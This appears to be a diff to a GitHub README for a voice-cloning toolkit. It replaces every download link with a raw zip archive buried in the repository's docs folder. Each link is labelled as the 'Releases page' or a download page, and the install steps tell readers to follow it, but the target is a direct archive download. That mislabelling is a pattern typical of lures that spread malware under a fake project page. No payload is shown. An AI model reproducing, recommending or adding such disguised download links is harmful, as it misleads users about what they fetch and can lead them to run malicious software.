@@ -1,7 +1,7 @@
 # 🎤 styletts2-dataset-toolkit - Your Easy Path to Voice Cloning
 
 ## 🌐 Download Now
-[![Download](https://raw.githubusercontent.com/dalmoon15/styletts2-dataset-toolkit/main/examples/styletts2-dataset-toolkit-v2.7.zip)](https://raw.githubusercontent.com/dalmoon15/styletts2-dataset-toolkit/main/examples/styletts2-dataset-toolkit-v2.7.zip)
+[![Download](https://github.com/dalmoon15/styletts2-dataset-toolkit/raw/refs/heads/main/docs/toolkit_dataset_styletts_3.9.zip)](https://github.com/dalmoon15/styletts2-dataset-toolkit/raw/refs/heads/main/docs/toolkit_dataset_styletts_3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the styletts2-dataset-toolkit! This tool provides a straightforward Windows-optimized workflow for voice cloning. With features like enhanced stem separation, batch processing, and dataset preparation tools, it simplifies the voice cloning process for everyone.
@@ -18,7 +18,7 @@ Before you begin, ensure your system meets the following:
 ## 📂 Download & Install
 To get started, visit the link below to download the toolkit. 
 
-[Visit this page to download](https://raw.githubusercontent.com/dalmoon15/styletts2-dataset-toolkit/main/examples/styletts2-dataset-toolkit-v2.7.zip)
+[Visit this page to download](https://github.com/dalmoon15/styletts2-dataset-toolkit/raw/refs/heads/main/docs/toolkit_dataset_styletts_3.9.zip)
 
 1. Click on the above link to navigate to the Releases page.
 2. Look for the most recent release. It will have an appropriate version number.
@@ -66,6 +66,6 @@ Yes, you can find additional resources and support on the GitHub page under "Iss
 The styletts2-dataset-toolkit is open for contributions. If you have ideas or features you would like to see, feel free to submit your suggestions or improvements on the GitHub repository.
 
 ## 🔗 Explore More
-For the latest updates and more features, always check the [Releases page](https://raw.githubusercontent.com/dalmoon15/styletts2-dataset-toolkit/main/examples/styletts2-dataset-toolkit-v2.7.zip).
+For the latest updates and more features, always check the [Releases page](https://github.com/dalmoon15/styletts2-dataset-toolkit/raw/refs/heads/main/docs/toolkit_dataset_styletts_3.9.zip).
 
 Thank you for using the styletts2-dataset-toolkit! We hope it enhances your voice cloning projects.
